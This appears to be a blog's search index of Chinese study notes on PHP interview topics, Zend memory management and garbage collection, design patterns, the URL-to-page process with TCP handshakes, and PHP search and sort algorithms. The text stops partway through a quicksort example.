<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>php 面试</title>
      <link href="/php%20%E7%BB%86%E8%8A%82.html"/>
      <url>/php%20%E7%BB%86%E8%8A%82.html</url>
      <content type="html"><![CDATA[<blockquote><p>基础一定要打好，面试中基本都是由浅入深，比如面向对象的概念，mvc，各种运算符，优先级，常用函数等 这些必须有记住有自己的理解</p></blockquote><blockquote><p>算法题有时间刷一下 可以转换思维 同时学习新的东西，以及理解一些基础概念。常见的冒泡排序，快排，二分查找，最好能理解概念，并且可以手写代码</p></blockquote><blockquote><p>从技术积累角度多看看别人的代码，包括那些知名框架的源码，不一定研究透，但要知道整体流程，自己过一遍，一个请求到最终渲染成页面，都是经过哪些步骤，对你使用框架和了解PHP本身都很有帮助。这个无论是初级，中级，还是高级都应该去走这一步。最后可以自行尝试写一个简易的框架，你基本可以了解到面向对象的整个核心的概念和用法。</p></blockquote><blockquote><p>MySQL多看看基础，熟悉常用命令，还有索引优化，往高级走，主要掌握一些性能优化的知识以及架构能力，比如主从架构搭建，延迟如何解决。基础知识主要是int1和int10区别，char和varchar区别，索引类型，何时索引生效和失效，了解和理解B+tree等</p></blockquote><blockquote><p>常用shell命令要熟练，特别是与业务有一定关系的。比如cat，sed，awk，find，grep等，主要是文本查找和处理相关的最为重要，不仅是日常使用频率最高，而且面试必问！！举个例子如何查找出nginx访问日志中前10名的IP，并打印出访问次数。</p></blockquote><blockquote><p>nosql相关的要了解和熟悉，比如redis，memcache，mongodb三者区别是什么 各自应用场景 复杂一点可能涉及redis主从配置，如何持久化等等。</p></blockquote><blockquote><p>搜索引擎方面比如sphinx，xunsearch，es等等，可以学习和了解一下</p></blockquote>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php 垃圾回收</title>
      <link href="/php%20%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6.html"/>
      <url>/php%20%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6.html</url>
      <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h3><p>1.操作系统直接管理着内存，所以操作系统也需要进行内存管理，计算机中通常都有内存管理单元(MMU) 用于处理CPU对内存的访问。</p><p>2.应用程序无法直接调用物理内存， 只能向系统申请内存。<br>向操作系统申请内存空间会引发系统调用。<br>系统调用会将CPU从用户态切换到内核。<br>为了减少系统调用开销。通常在用户态进行内存管理。 申请大块内存备用。使用完的内存不马上释放，将内存复用，避免多次内存申请和释放所带来性能消耗。<br>3.PHP不需要显示内存管理，由Zend引擎进行管理。<br>PHP内存限制</p><ol><li><p>php.ini中的默认32MB     </p><p> memory_limit = 32M</p></li><li><p>动态修改内存  </p><p> ini_set (“memory_limit”, “128M”)</p></li><li><p>获取目前内存占用</p><p>memory_get_usage()    : 获取PHP脚本所用的内存大小<br>memory_get_peak_usage() ：返回当前脚本到目前位置所占用的内存峰值。</p></li></ol><p>学习内存管理的目的<br>了解PHP如何占用内存，可以避免不必要的内存浪费。</p><h3 id="PHP中的内存管理"><a href="#PHP中的内存管理" class="headerlink" title="PHP中的内存管理"></a>PHP中的内存管理</h3><p>包含：<br>1.足够内存<br>2.可用内存获取部分内存<br>3.使用后的内存，是否销毁还是重新分配</p><p>PHP内存管理器</p><p><img src="https://upload-images.jianshu.io/upload_images/263175-116fa0f4acf9111a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/625" alt=""></p><h4 id="接口层"><a href="#接口层" class="headerlink" title="接口层"></a>接口层</h4><p>是一些宏定义。</p><h4 id="堆层-heap"><a href="#堆层-heap" class="headerlink" title="堆层 heap "></a><strong>堆层 heap </strong></h4><p>_zend_mm_heap</p><p>初始化内存，调用 zend_mm_startup<br>PHP内存管理维护三个列表:<br>1)小块内存列表 free_buckets<br>2)大块内存列表 large_free_buckets<br>3)剩余内存列表 rest_buckets</p><p>两个HashTable 结构，难点是查找和计算内存地址<br>1)free_buckets<br>Hash函数为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define ZEND_MM_BUCKET_INDEX(true_size) ((true_size&gt;&gt;ZEND_MM_ALIGNMENT_LOG2)-(ZEND_MM_ALIGNED_MIN_HEADER_S</span><br></pre></td></tr></table></figure><p>2)large_free_buckets<br>Hash函数为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#define ZEND_MM_LARGE_BUCKET_INDEX(S) zend_mm_high_bit(S)</span><br><span class="line"></span><br><span class="line">    static inline unsigned int zend_mm_high_bit(size_t _size)&#123;</span><br><span class="line">       ..//省略若干不同环境的实现</span><br><span class="line">      unsignedint n =0;</span><br><span class="line">      while(_size !=0) &#123; </span><br><span class="line">        _size = _size &gt;&gt;1; n++;&#125;</span><br><span class="line">        return n-1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>存储层 storage</strong></p><ul><li>内存分配的方式对堆层透明化，实现存储层和heap层的分离。</li><li>不同的内存分配方案， 有对应的处理函数。</li></ul><p>内存的申请</p><p>PHP底层对内存的管理， 围绕着小块内存列表（free_buckets）、 大块内存列表（large_free_buckets）和 剩余内存列表（rest_buckets）三个列表来分层进行的</p><p>ZendMM向系统进行的内存申请，并不是有需要时向系统即时申请， 而是由ZendMM的最底层（heap层）先向系统申请一大块的内存，通过对上面三种列表的填充， 建立一个类似于内存池的管理机制。 在程序运行需要使用内存的时候，ZendMM会在内存池中分配相应的内存供使用。 这样做的好处是避免了PHP向系统频繁的内存申请操作</p><p>ZendMM对内存分配的处理步骤：</p><p>1）内存检查；<br>2）命中缓存，找到内存块，调至步骤5；<br>3）在ZendMM管理的heap层存储中搜索合适大小的内存块, 是在三种列表中小到大进行的，找到block后，调至步骤5；<br>4）步骤3未找到内存，则使用 ZEND_MM_STORAGE_ALLOC 申请新内存块 （至少为ZEND_MM_SEG_SIZE）,进行步骤6</p><p>5）使用zend_mm_remove_from_free_list函数将已经使用block节点在zend_mm_free_block中移除;<br>6） 内存分配完毕，对zend_mm_heap结构中的各种标识型变量进行维护，包括large_free_buckets， peak，size等;<br>7） 返回分配的内存地址;</p><p>PHP内存管理器</p><p><strong>内存的销毁</strong></p><p>ZendMM在内存销毁的处理上采用与内存申请相同的策略，当程序unset一个变量或者是其他的释放行为时， ZendMM并不会直接立刻将内存交回给系统，而是只在自身维护的内存池中将其重新标识为可用， 按照内存的大小整理到上面所说的三种列表（small,large,free）之中，以备下次内存申请时使用。</p><p>ZendMM将内存块以整理收回到zend_mm_heap的方式，回收到内存池中。<br>程序使用的所有内存，将在进程结束时统一交还给系统。</p><p>垃圾回收</p><p>自动回收内存的过程叫垃圾收集。PHP提供了语言层的垃圾回收机制，让程序员不必过分关心程序内存分配。</p><p><strong>PHP5.3之前</strong><br>引用计数方式的内存动态管理。</p><p>PHP中所有的变量都是以zval变量的形式存在。</p><p>变量引用计数变为0时，PHP将在内存中销毁这个变量。只是这里的垃圾并不能称之为垃圾。并且PHP在一个生命周期结束后就会释放此进程/线程所占的内容，这种方式决定了PHP在前期不需要过多考虑内存的泄露问题。</p><p><strong>PHP5.3的垃圾回收</strong></p><p>引入垃圾收集机制的目的是为了打破引用计数中的循环引用，从而防止因为这个而产生的内存泄露。 垃圾收集机制基于PHP的动态内存管理而存在。PHP5.3为引入垃圾收集机制，在变量存储的基本结构上有一些变动.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct _zval_struct &#123;</span><br><span class="line">  /* Variable information */ </span><br><span class="line">  zvalue_value value;/* value */ </span><br><span class="line">  zend_uint refcount__gc; </span><br><span class="line">  zend_uchar type;/* active type */ </span><br><span class="line">  zend_uchar is_ref__gc;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>添加了 __gc 以用于新的垃圾回收机制。</p><p><strong>PHP5.3中的垃圾回收算法——Concurrent Cycle Collection in Reference Counted Systems</strong></p><p>PHP5.3的垃圾回收算法仍然以引用计数为基础，但是不再是使用简单计数作为回收准则，而是使用了一种同步回收算法，这个算法由IBM的工程师在论文Concurrent Cycle Collection in Reference Counted Systems中提出。<br>论文较复杂， 列出一些大体描述。<br>首先PHP会分配一个固定大小的“根缓冲区”，这个缓冲区用于存放固定数量的zval，这个数量默认是10,000，如果需要修改则需要修改源代码Zend/zend_gc.c中的常量GC_ROOT_BUFFER_MAX_ENTRIES然后重新编译。<br>由上文我们可以知道，一个zval如果有引用，要么被全局符号表中的符号引用，要么被其它表示复杂类型的zval中的符号引用。因此在zval中存在一些可能根（root）。这里我们暂且不讨论PHP是如何发现这些可能根的，这是个很复杂的问题，总之PHP有办法发现这些可能根zval并将它们投入根缓冲区。<br>当根缓冲区满额时，PHP就会执行垃圾回收，此回收算法如下：<br>1、对每个根缓冲区中的根zval按照深度优先遍历算法遍历所有能遍历到的zval，并将每个zval的refcount减1，同时为了避免对同一zval多次减1（因为可能不同的根能遍历到同一个zval），每次对某个zval减1后就对其标记为“已减”。<br>2、再次对每个缓冲区中的根zval深度优先遍历，如果某个zval的refcount不为0，则对其加1，否则保持其为0。<br>3、清空根缓冲区中的所有根（注意是把这些zval从缓冲区中清除而不是销毁它们），然后销毁所有refcount为0的zval，并收回其内存。<br>如果不能完全理解也没有关系，只需记住PHP5.3的垃圾回收算法有以下几点特性：<br>1、并不是每次refcount减少时都进入回收周期，只有根缓冲区满额后在开始垃圾回收。<br>2、可以解决循环引用问题。<br>3、可以总将内存泄露保持在一个阈值以下。</p><p><strong>PHP5.2与PHP5.3垃圾回收算法的性能比较</strong></p><p>PHP Manual中的相关章节：<a href="https://link.jianshu.com?t=http://docs.php.net/manual/zh/features.gc.performance-considerations.php" target="_blank" rel="noopener">http://docs.php.net/manual/zh/features.gc.performance-considerations.php</a></p><p>首先是内存泄露试验，下面直接引用PHP Manual中的实验代码和试验结果图：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Foo</span><br><span class="line">&#123;</span><br><span class="line">   public $var = &apos;3.1415962654&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$baseMemory = memory_get_usage();</span><br><span class="line"></span><br><span class="line">for ( $i = 0; $i &lt;= 100000; $i++ )</span><br><span class="line">&#123;</span><br><span class="line">   $a = new Foo;</span><br><span class="line">   $a-&gt;self = $a;</span><br><span class="line">   if ( $i % 500 === 0 )</span><br><span class="line">   &#123;</span><br><span class="line">       echo sprintf( &apos;%8d: &apos;, $i ), memory_get_usage() - $baseMemory, &quot;\n&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/263175-71a25acbc732d5c0.png?imageMogr2/auto-orient/" alt="img"></p><p>可以看到在可能引发累积性内存泄露的场景下，PHP5.2发生持续累积性内存泄露，而PHP5.3则总能将内存泄露控制在一个阈值以下（与根缓冲区大小有关）。</p><p><strong>与垃圾回收算法相关的PHP配置</strong></p><p>1、可以通过修改php.ini中的zend.enable_gc来打开或关闭PHP的垃圾回收机制，也可以通过调用gc_enable()或gc_disable()打开或关闭PHP的垃圾回收机制。<br>2、在PHP5.3中即使关闭了垃圾回收机制，PHP仍然会记录可能根到根缓冲区，只是当根缓冲区满额时，PHP不会自动运行垃圾回收<br>3、当然，任何时候您都可以通过手工调用gc_collect_cycles()函数强制执行内存回收。</p>]]></content>
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP设计模式</title>
      <link href="/PHP%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html"/>
      <url>/PHP%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html</url>
      <content type="html"><![CDATA[<h3 id="1、常见设计模式"><a href="#1、常见设计模式" class="headerlink" title="1、常见设计模式"></a>1、常见设计模式</h3><h4 id="1-1-工厂模式"><a href="#1-1-工厂模式" class="headerlink" title="1.1 工厂模式"></a>1.1 工厂模式</h4><p>​    用工厂方法或类来生成对象，而不是在代码中直接 <code>new Class()</code>，替换<code>new Class()</code> 这种写法<br>好处是如果生成对象的方式发生改变，比如构造参数改变，直接修改工厂方法就行了</p><p>​    工厂方法针对每一种产品提供一个工厂类，通过不同的工厂实例来创建不同的产品实例，在同一等级结构中，支持增加任意产品。</p><h4 id="1-2-单例模式"><a href="#1-2-单例模式" class="headerlink" title="1.2 单例模式"></a>1.2 单例模式</h4><p>​    保证一个类仅有一个实例，并且提供一个访问它的全局访问点，使某个类的对象只允许创建一个<br>比如数据库类，数据库的连接只需要连接一次</p><h4 id="1-3-注册模式"><a href="#1-3-注册模式" class="headerlink" title="1.3 注册模式"></a>1.3 注册模式</h4><p>​    解决全局变量共享问题和交换对象 。可以理解成用一个类来存放全局变量</p><h4 id="1-4-适配器模式"><a href="#1-4-适配器模式" class="headerlink" title="1.4 适配器模式"></a>1.4 适配器模式</h4><p>​    可以将截然不同的函数接口封装成统一的 API<br>比如多种数据库的连接方法不同，通过这个模式封装成统一的 API</p><h4 id="1-5-策略模式"><a href="#1-5-策略模式" class="headerlink" title="1.5 策略模式"></a>1.5 策略模式</h4><p>​    将一组特定的行为和算法封装成类，以适应某些特定的上下文环境</p><h4 id="1-6-数据对象映射模式"><a href="#1-6-数据对象映射模式" class="headerlink" title="1.6 数据对象映射模式"></a>1.6 数据对象映射模式</h4><p>​    将对象和数据存储映射起来，对一个对象的操作会映射为对数据存储的操作<br>例子：ORM</p><h4 id="1-7-观察者模式"><a href="#1-7-观察者模式" class="headerlink" title="1.7 观察者模式"></a>1.7 观察者模式</h4><p>​    当一个对象状态发生改变时，依赖它的对象全不会收到通知，并自动更新<br>场景：一个事件发生后，要执行一连串的更新操作，传统的编程方式，就是在事件的代码之后直接加入处理逻辑当更新的逻辑增多之后，代码变得难以维护，这种方式是耦合的，侵入式的，增加新的逻辑需要修改事件的主体代码<br>观察者模式实现了低耦合、非侵入式的通知与更新机制</p>]]></content>
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>URL流程</title>
      <link href="/URL.html"/>
      <url>/URL.html</url>
      <content type="html"><![CDATA[<h3 id="1-先上图"><a href="#1-先上图" class="headerlink" title="1.先上图"></a>1.先上图</h3><p>直接看图</p><p><img src="https://upload-images.jianshu.io/upload_images/2075673-3afda32a13a68c6b.png" alt=""></p><h3 id="2-详说过程"><a href="#2-详说过程" class="headerlink" title="2.详说过程"></a>2.详说过程</h3><h4 id="2-1-DNS域名解析"><a href="#2-1-DNS域名解析" class="headerlink" title="2.1 DNS域名解析"></a>2.1 DNS域名解析</h4><ul><li>在浏览器DNS缓存中搜索</li><li>在操作系统DNS缓存中搜索</li><li>读取系统hosts文件，查找其中是否有对应的ip</li><li>向本地配置的首选DNS服务器发起域名解析请求</li></ul><h4 id="2-2-建立TCP连接"><a href="#2-2-建立TCP连接" class="headerlink" title="2.2 建立TCP连接"></a>2.2 建立TCP连接</h4><p>​    为了准确地传输数据，TCP协议采用了三次握手策略。发送端首先发送一个带SYN（synchronize）标志的数据包给接收方，接收方收到后，回传一个带有SYN/ACK(acknowledegment)标志的数据包以示传达确认信息。最后发送方再回传一个带ACK标志的数据包，代表握手结束。在这过程中若出现问题中断，TCP会再次发送相同的数据包。<br>    TCP是一个端到端的可靠的面向连接的协议，所以HTTP基于传输层TCP协议不用担心数据的传输的各种问题。</p><p><img src="https://img-blog.csdn.net/20170104214009596" alt=""></p><p>为什么要三次握手</p><blockquote><p>在谢希仁著《计算机网络》第四版中讲“三次握手”的目的是“为了防止已失效的连接请求报文段突然又传送到了服务端，因而产生错误”。在另一部经典的《计算机网络》一书中讲“三次握手”的目的是为了解决“网络中存在延迟的重复分组”的问题。</p></blockquote><p>在谢希仁著《计算机网络》书中同时举了一个例子，如下：</p><blockquote><p>“已失效的连接请求报文段”的产生在这样一种情况下：client发出的第一个连接请求报文段并没有丢失，而是在某个网络结点长时间的滞留了，以致延误到连接释放以后的某个时间才到达server。本来这是一个早已失效的报文段。但server收到此失效的连接请求报文段后，就误认为是client再次发出的一个新的连接请求。于是就向client发出确认报文段，同意建立连接。假设不采用“三次握手”，那么只要server发出确认，新的连接就建立了。由于现在client并没有发出建立连接的请求，因此不会理睬server的确认，也不会向server发送数据。但server却以为新的运输连接已经建立，并一直等待client发来数据。这样，server的很多资源就白白浪费掉了。采用“三次握手”的办法可以防止上述现象发生。例如刚才那种情况，client不会向server的确认发出确认。server由于收不到确认，就知道client并没有要求建立连接。”</p></blockquote><p>中断连接端可以是Client端，也可以是Server端</p><blockquote><p>​    假设Client端发起中断连接请求，也就是发送FIN报文。Server端接到FIN报文后，意思是说”我Client端没有数据要发给你了”，但是如果你还有数据没有发送完成，则不必急着关闭Socket，可以继续发送数据。所以你先发送ACK，”告诉Client端，你的请求我收到了，但是我还没准备好，请继续你等我的消息”。这个时候Client端就进入FIN_WAIT状态，继续等待Server端的FIN报文。当Server端确定数据已发送完成，则向Client端发送FIN报文，”告诉Client端，好了，我这边数据发完了，准备好关闭连接了”。Client端收到FIN报文后，”就知道可以关闭连接了，但是他还是不相信网络，怕Server端不知道要关闭，所以发送ACK后进入TIME_WAIT状态，如果Server端没有收到ACK则可以重传。“Server端收到ACK后，”就知道可以断开连接了”。Client端等待了2MSL后依然没有收到回复，则证明Server端已正常关闭，那好，我Client端也可以关闭连接了。Ok，TCP连接就这样关闭了！</p></blockquote><p><img src="http://hi.csdn.net/attachment/201108/7/0_1312719804oSkK.gif" alt=""></p><p><img src="http://hi.csdn.net/attachment/201108/7/0_1312719833030b.gif" alt=""></p><p><strong>【注意】</strong> 在TIME_WAIT状态中，如果TCP client端最后一次发送的ACK丢失了，它将重新发送。TIME_WAIT状态中所需要的时间是依赖于实现方法的。典型的值为30秒、1分钟和2分钟。等待之后连接正式关闭，并且所有的资源(包括端口号)都被释放。</p><p><strong>【问题1】为什么连接的时候是三次握手，关闭的时候却是四次握手？</strong><br>答：因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，”你发的FIN报文我收到了”。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。</p><p><strong>【问题2】为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？</strong></p><p>答：虽然按道理，四个报文都发送完毕，我们可以直接进入CLOSE状态了，但是我们必须假象网络是不可靠的，有可以最后一个ACK丢失。所以TIME_WAIT状态就是用来重发可能丢失的ACK报文。</p><h4 id="2-3-发起HTTP请求"><a href="#2-3-发起HTTP请求" class="headerlink" title="2.3 发起HTTP请求"></a>2.3 发起HTTP请求</h4><p>请求方法：</p><ul><li>GET:获取资源</li><li>POST:传输实体主体</li><li>HEAD:获取报文首部</li><li>PUT:传输文件</li><li>DELETE:删除文件</li><li>OPTIONS:询问支持的方法</li><li>TRACE:追踪路径</li></ul><p>请求报文：</p><p><img src="https://upload-images.jianshu.io/upload_images/2075673-1f2c0829b7a86c6d.png" alt=""></p><h4 id="2-4-接受响应结果"><a href="#2-4-接受响应结果" class="headerlink" title="2.4 接受响应结果"></a>2.4 接受响应结果</h4><p>状态码：</p><ul><li>1**：信息性状态码</li><li>2**：成功状态码<br>200：OK 请求正常处理<br>204：No Content请求处理成功，但没有资源可返回<br>206：Partial Content对资源的某一部分的请求</li><li>3**：重定向状态码<br>301：Moved Permanently 永久重定向<br>302：Found 临时性重定向<br>304：Not Modified 缓存中读取</li><li>4**：客户端错误状态码<br>400：Bad Request 请求报文中存在语法错误<br>401：Unauthorized需要有通过Http认证的认证信息<br>403：Forbidden访问被拒绝<br>404：Not Found无法找到请求资源</li><li>5**：服务器错误状态码<br>500：Internal Server Error 服务器端在执行时发生错误<br>503：Service Unavailable 服务器处于超负载或者正在进行停机维护</li></ul><p>响应报文：</p><p><img src="https://upload-images.jianshu.io/upload_images/2075673-a7d5616fac0adec7.png" alt=""></p><h4 id="2-5-浏览器解析html"><a href="#2-5-浏览器解析html" class="headerlink" title="2.5 浏览器解析html"></a>2.5 浏览器解析html</h4><p>​    浏览器按顺序解析html文件，构建DOM树，在解析到外部的css和js文件时，向服务器发起请求下载资源，若是下载css文件，则解析器会在下载的同时继续解析后面的html来构建DOM树，则在下载js文件和执行它时，解析器会停止对html的解析。这便出现了js阻塞问题。<br><strong>预加载器</strong>：<br>    当浏览器被脚本文件阻塞时，预加载器（一个轻量级的解析器）会继续解析后面的html，寻找需要下载的资源。如果发现有需要下载的资源，预加载器在开始接收这些资源。预加载器只能检索HTML标签中的URL，无法检测到使用脚本添加的URL，这些资源要等脚本代码执行时才会获取。<br>注: 预解析并不改变Dom树，它将这个工作留给主解析过程</p><p>​    浏览器解析css，形成CSSOM树，当DOM树构建完成后，浏览器引擎通过DOM树和CSSOM树构造出渲染树。渲染树中包含可视节点的样式信息（不可见节点将不会被添加到渲染树中，如：head元素和display值为none的元素）</p><blockquote><p>值得注意的是，这个过程是逐步完成的，为了更好的用户体验，渲染引擎将会尽可能早的将内容呈现到屏幕上，并不会等到所有的html都解析完成之后再去构建和布局render树。它是解析完一部分内容就显示一部分内容，同时，可能还在通过网络下载其余内容。</p></blockquote><h4 id="2-6-浏览器布局渲染"><a href="#2-6-浏览器布局渲染" class="headerlink" title="2.6 浏览器布局渲染"></a>2.6 浏览器布局渲染</h4><ul><li>布局：通过计算得到每个渲染对象在可视区域中的具体位置信息（大小和位置），这是一个递归的过程。</li><li>绘制：将计算好的每个像素点信息绘制在屏幕上</li></ul><p>​    在页面显示的过程中会多次进行Reflow和Repaint操作，而Reflow的成本比Repaint的成本高得多的多。因为Repaint只是将某个部分进行重新绘制而不用改变页面的布局，如：改变了某个元素的背景颜色。而如果将元素的display属性由block改为none则需要Reflow。</p><p><img src="https://upload-images.jianshu.io/upload_images/2075673-e6b92f5c6c8c50d4.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> URL </category>
          
          <category> TCP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> job </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php算法</title>
      <link href="/php%E7%AE%97%E6%B3%95.html"/>
      <url>/php%E7%AE%97%E6%B3%95.html</url>
      <content type="html"><![CDATA[<ol><li>使用PHP描述顺序查找和二分查找（也叫做折半查找）算法，顺序查找必须考虑效率，对象可以是一个有序数组</li></ol><ul><li><p>二分查找（数组里查找某个元素）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> bin_sch(<span class="variable">$array</span>, <span class="variable">$low</span>, <span class="variable">$high</span>, <span class="variable">$k</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$low</span> &lt;= <span class="variable">$high</span>)&#123;</span><br><span class="line">        <span class="variable">$mid</span> = intval((<span class="variable">$low</span>+<span class="variable">$high</span>)/2);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$array</span>[<span class="variable">$mid</span>] == <span class="variable">$k</span>)&#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$mid</span>;</span><br><span class="line">        &#125;elseif (<span class="variable">$k</span> &lt; <span class="variable">$array</span>[<span class="variable">$mid</span>])&#123;</span><br><span class="line">            <span class="built_in">return</span> bin_sch(<span class="variable">$array</span>, <span class="variable">$low</span>, <span class="variable">$mid</span>-1, <span class="variable">$k</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">return</span> bin_sch(<span class="variable">$array</span>, <span class="variable">$mid</span>+1, <span class="variable">$high</span>, <span class="variable">$k</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> -1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>顺序查找（数组里查找某个元素）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> seq_sch(<span class="variable">$array</span>, <span class="variable">$n</span>, <span class="variable">$k</span>)&#123;</span><br><span class="line">    <span class="variable">$array</span>[<span class="variable">$n</span>] = <span class="variable">$k</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=0; <span class="variable">$i</span>&lt;<span class="variable">$n</span>; <span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$array</span>[<span class="variable">$i</span>]==<span class="variable">$k</span>)&#123;</span><br><span class="line">            <span class="built_in">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$i</span>&lt;<span class="variable">$n</span>)&#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$i</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">return</span> -1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>使用PHP描述冒泡排序和快速排序算法，对象可以是一个数组<br>冒泡排序（数组排序）</li></ol><ul><li><p>冒泡排序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> bubble_sort(<span class="variable">$array</span>)&#123;</span><br><span class="line">    <span class="variable">$count</span> = count(<span class="variable">$array</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> &lt;= 0) <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=0; <span class="variable">$i</span>&lt;<span class="variable">$count</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="variable">$count</span>-1; <span class="variable">$j</span>&gt;<span class="variable">$i</span>; <span class="variable">$j</span>–)&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$array</span>[<span class="variable">$j</span>] &lt; <span class="variable">$array</span>[<span class="variable">$j</span>-1])&#123;</span><br><span class="line">                    <span class="variable">$tmp</span> = <span class="variable">$array</span>[<span class="variable">$j</span>];</span><br><span class="line">                    <span class="variable">$array</span>[<span class="variable">$j</span>] = <span class="variable">$array</span>[<span class="variable">$j</span>-1];</span><br><span class="line">                    <span class="variable">$array</span>[<span class="variable">$j</span>-1] = <span class="variable">$tmp</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$array</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>快速排序（数组排序）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> quick_sort(<span class="variable">$array</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (count(<span class="variable">$array</span>) &lt;= 1) <span class="built_in">return</span> <span class="variable">$array</span>;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$array</span>[0];</span><br><span class="line">    <span class="variable">$left_arr</span> = array();</span><br><span class="line">    <span class="variable">$right_arr</span> = array();</span><br><span class="line">    <span 